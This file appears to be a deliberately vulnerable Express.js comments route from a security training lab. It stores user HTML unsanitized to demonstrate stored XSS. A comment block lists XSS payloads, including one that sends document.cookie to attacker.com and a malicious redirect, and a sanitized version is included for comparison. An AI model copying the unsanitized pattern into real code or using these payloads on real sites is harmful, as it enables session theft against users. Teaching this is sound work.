// routes/comments.js - Comments Routes (INTENTIONALLY VULNERABLE TO XSS)
const express = require('express');
const router = express.Router();
const { db } = require('../database/db');

// GET comments for a specific post
router.get('/:postId', (req, res) => {
  const postId = req.params.postId;
  
  const query = 'SELECT * FROM comments WHERE post_id = ? ORDER BY created_at DESC';
  
  db.all(query, [postId], (err, rows) => {
    if (err) {
      console.error('Error fetching comments:', err.message);
      return res.status(500).json({ error: 'Failed to fetch comments' });
    }
    res.json(rows);
  });
});

// 🔴 VULNERABLE: POST new comment (Stored XSS vulnerability)
// This endpoint stores user input without sanitization
// The frontend then renders it without escaping
router.post('/:postId', (req, res) => {
  const postId = req.params.postId;
  const { author, content } = req.body;
  
  if (!author || !content) {
    return res.status(400).json({ error: 'Author and content are required' });
  }
  
  console.log('⚠️  VULNERABLE COMMENT - Storing unsanitized HTML/JS:', { author, content });
  
  // DANGEROUS: No sanitization or validation of HTML/JavaScript content!
  // This allows attackers to inject malicious scripts
  const query = 'INSERT INTO comments (post_id, author, content) VALUES (?, ?, ?)';
  
  db.run(query, [postId, author, content], function(err) {
    if (err) {
      console.error('Error creating comment:', err.message);
      return res.status(500).json({ error: 'Failed to create comment' });
    }
    
    console.log(`✅ Stored potentially malicious comment with ID: ${this.lastID}`);
    
    res.status(201).json({
      id: this.lastID,
      post_id: postId,
      author,
      content, // Returning unsanitized content
      message: 'Comment posted successfully'
    });
  });
});

/*
  TESTING STORED XSS:
  
  Try posting comments with these payloads:
  
  1. Simple alert:
     <script>alert('XSS')</script>
  
  2. Image with onerror:
     <img src=x onerror="alert('XSS Attack!')">
  
  3. Steal cookies (in a real scenario):
     <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
  
  4. Redirect attack:
     <script>window.location='http://malicious-site.com'</script>
  
  5. DOM manipulation:
     <script>document.body.innerHTML='<h1>Hacked!</h1>'</script>
  
  6. Event handler:
     <img src="" onerror="document.write('XSS')">
  
  7. SVG-based XSS:
     <svg onload="alert('XSS')"></svg>
*/

// DELETE comment (bonus feature)
router.delete('/:commentId', (req, res) => {
  const commentId = req.params.commentId;
  
  db.run('DELETE FROM comments WHERE id = ?', [commentId], function(err) {
    if (err) {
      console.error('Error deleting comment:', err.message);
      return res.status(500).json({ error: 'Failed to delete comment' });
    }
    
    if (this.changes === 0) {
      return res.status(404).json({ error: 'Comment not found' });
    }
    
    res.json({ message: 'Comment deleted successfully' });
  });
});

// SECURE VERSION (commented out - for comparison):
/*
const sanitizeHtml = require('sanitize-html');

router.post('/:postId/secure', (req, res) => {
  const postId = req.params.postId;
  const { author, content } = req.body;
  
  // SAFE: Sanitize HTML content
  const sanitizedAuthor = sanitizeHtml(author, { allowedTags: [], allowedAttributes: {} });
  const sanitizedContent = sanitizeHtml(content, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],
    allowedAttributes: { 'a': ['href'] }
  });
  
  const query = 'INSERT INTO comments (post_id, author, content) VALUES (?, ?, ?)';
  
  db.run(query, [postId, sanitizedAuthor, sanitizedContent], function(err) {
    if (err) {
      return res.status(500).json({ error: 'Failed to create comment' });
    }
    res.status(201).json({ id: this.lastID, message: 'Comment posted securely' });
  });
});
*/

module.exports = router;
